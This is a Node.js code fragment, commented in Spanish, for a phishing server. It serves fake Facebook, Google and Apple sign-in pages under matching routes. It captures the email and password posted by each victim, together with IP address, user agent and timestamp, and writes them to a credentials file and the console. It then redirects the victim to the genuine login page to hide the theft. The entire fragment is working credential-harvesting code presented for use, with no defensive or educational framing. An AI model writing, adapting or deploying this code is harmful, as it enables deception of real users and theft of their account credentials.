// Función para servir HTML simple de phishing
function servePhish(res, platform, redirectUrl) {
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>${platform} - Iniciar sesión</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .box { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 320px; text-align: center; }
            input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
            button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        </style>
    </head>
    <body>
        <div class="box">
            <h2>${platform}</h2>
            <p>Inicia sesión para continuar</p>
            <form method="post" action="${redirectUrl}">
                <input type="text" name="email" placeholder="Correo electrónico o teléfono" required>
                <input type="password" name="pass" placeholder="Contraseña" required>
                <button type="submit">Iniciar sesión</button>
            </form>
        </div>
    </body>
    </html>`;
    res.writeHead(200, {'Content-Type': 'text/html; charset=utf-8'});
    res.end(html);
}

// Rutas de phishing alternativo
if (req.url === '/facebook' || req.url === '/google' || req.url === '/apple') {
    const platformMap = {
        '/facebook': 'Facebook',
        '/google': 'Google',
        '/apple': 'Apple'
    };
    const platform = platformMap[req.url];
    // La acción del formulario apunta a la misma ruta para capturar el POST
    servePhish(res, platform, req.url);
    return;
}

// Capturar POST de estas rutas
if (req.method === 'POST' && ['/facebook', '/google', '/apple'].includes(req.url)) {
    let body = '';
    req.on('data', chunk => { body += chunk.toString(); });
    req.on('end', () => {
        const params = new URLSearchParams(body);
        const email = params.get('email') || 'vacío';
        const pass = params.get('pass') || 'vacío';
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const ua = req.headers['user-agent'] || 'desconocido';
        const fecha = new Date().toISOString();
        const platform = req.url.replace('/', '');
        const log = `PHISHING-${platform}: Email=${email} | Pass=${pass} | IP=${ip} | UA=${ua} | Fecha=${fecha}\n`;
        fs.appendFile('credenciales.txt', log, (err) => {
            if (err) console.error(err);
        });
        console.log(log);
        // Redirigir a la página real de la plataforma para disimular
        const realUrls = {
            '/facebook': 'https://www.facebook.com/login',
            '/google': 'https://accounts.google.com',
            '/apple': 'https://appleid.apple.com'
        };
        res.writeHead(302, { Location: realUrls[req.url] });
        res.end();
    });
    return;
}
